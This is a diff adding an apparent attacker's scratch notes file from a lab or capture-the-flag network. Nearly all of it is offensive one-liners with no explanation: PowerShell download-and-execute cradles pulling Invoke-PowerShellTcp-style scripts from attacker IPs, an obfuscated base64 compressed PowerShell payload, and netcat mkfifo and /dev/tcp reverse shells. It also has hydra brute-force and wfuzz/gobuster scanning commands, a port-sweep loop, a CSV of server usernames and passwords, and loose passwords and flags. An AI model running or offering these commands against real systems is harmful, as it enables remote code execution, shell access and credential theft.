@@ -1,0 +1,43 @@
+charles.mcgowen
+Ch4rl3s...GoodLUCK!@#
+IEX(New-Object Net.WebClient).downloadString('http://192.168.2.8/Invoke-pinkie.ps1')
+powershell+IEX(New-Object+Net.WebClient).downloadString(‘http://192.168.2.8/Invole-pinkie.ps1')
+10.0.0.2:8080/mail/contact_me.php
+c:\windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://192.168.2.8/Invoke-pinkie.ps1')
+wfuzz -c  -w /home/htb/wordlist/seclist/Discovery/Web-Content/burp-parameter-names.txt -u http://10.0.0.2/mail/contact_me.php?FUZZ=junk
+C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.14/Invoke-PowerShellTcp.ps1')
+c:\windows\system32\powershell -NoE -Nop -NonI -ExecutionPolicy Bypass -C "sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"
+hydra -l admin -P rockyou.txt -u http://10.0.0.1 -http-form-post "__csrf_magic=sid%3A95dbe5c384bab1953c718b3be04dd21e4e981dfa%2C1560216361&usernamefld=admin&passwordfld=aaaaaa&login=Sign+In:Username or Password incorrect"
+c:/windows/system32/system32/WindowsPowerShell/v1.0/PowerShell.exe -Version 2 -ExecutionPolicy ByPass -command "IEX(New-Object Net.WebClient).downloadString('http://192.168.2.8/Invoke-pinkie.ps1')"
+"/bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.122.1 9056 >/tmp/f'"
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.2.8 9913 >/tmp/f
+my_passwords_list.txt
+14MGR00T!!!
+find /etc/ -type f -ls |grep '25'
+gobuster -u http://10.100.10.25 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100 
+find /etc/ -type f -ls |grep 'Feb 12'
+S0_y0u_c4n_sudo_wid_d@_b3$t!!
+
+/bin/bash -i >& /dev/tcp/192.168.2.9/9913 0>&1
+sudo bash -i >& /dev/tcp/192.168.2.10/443 0>&1
+hydra 10.100.10.139 -l root -P /home/htb/wordlist/rockyou.txt -t 64 ssh 
+wget --no-passive-ftp -m ftp://anonymous@10.100.10.139
+server,user,password,notes
+10.100.10.21,david,david
+10.100.10.25,root,AllMyBas3srBELONGt0m3
+10.100.20.1,admin,pfsense
+10.0.0.1,admin,
+10.0.0.2,admin,
+for ip in $(seq 1 254); do
+for i in {1..254}; do nc -v -n -z -w 1 10.100.10.$i 22; done | grep -v 'timed'
+done
+wfuzz -c  -w /home/htb/wordlist/seclist/Discovery/Web-Content/burp-parameter-names.txt -u http://10.100.10.25/index.php?FUZZ=junk
+sthompson hackersW4ntT0Bm3
+Glad_to_s33_U_c4n_upload_files!
+yOu4_S1lver_n_MY_B00ks
+65af2bf5f5c7d6802d01bf967917e0cd
+t7dqohu8n7wq
+aob8q
+abc123!@#
+P0n3y_uP_and_GRAB_d1$_K3Y
+2c00l4_security_
